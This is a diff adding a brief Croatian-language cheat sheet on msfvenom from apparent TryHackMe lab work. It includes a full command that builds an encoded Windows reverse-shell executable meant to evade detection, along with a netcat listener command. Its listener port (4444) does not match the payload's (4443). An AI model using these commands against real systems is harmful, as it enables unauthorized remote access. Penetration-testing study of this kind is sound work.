@@ -1,0 +1,27 @@
+Podsjetnik na rad msfvenoma
+
+MSFVENOM je alat koji koristimo kada zelimo generirati maliciozni payload.
+
+Primjer nardbe:
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.235.84 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+
+-p se odnosi na payload, ako ih zelimo vidjeti ostale mozemo to napraviti naredbom: msfvenom -l payloads
+U nasemu slucaju odabiremo payload windows/shell_reverse_tcp jer smo slali na windows.
+
+LHOST i LPORT se odnosi na local host i port, tj ip adresa i port na kojemu cemo slusati; u nasemu slucaju cemo koristiti nc -lvnp 4444 jer koristimo reverse shell payload
+
+-e se odnosi na nacin enkodiranja paketa tako da se teže detektira.
+Izlisatavamo nacine enkodiranja preko msfvenom -l encoders
+Mi smo koristili shikata_ga_nai, no za svrhe tryhackme laboratorija svi su dobri
+
+-f exe-service je vrsta output formata i preko toga odabiremo nacin na koji nacin ce biti moguce pokrenuti nas paket.
+msfvenom -l formats
+Neki znacajnini formati su:
+- exe
+- exe-service - koristi se za win executable kao win servise
+- sh -linux shell skripta
+- python - python skripta sa podatcima
+- raw - raw shellcode
+
+-o zastavica se koristi da se da naziv output datototeci 
+
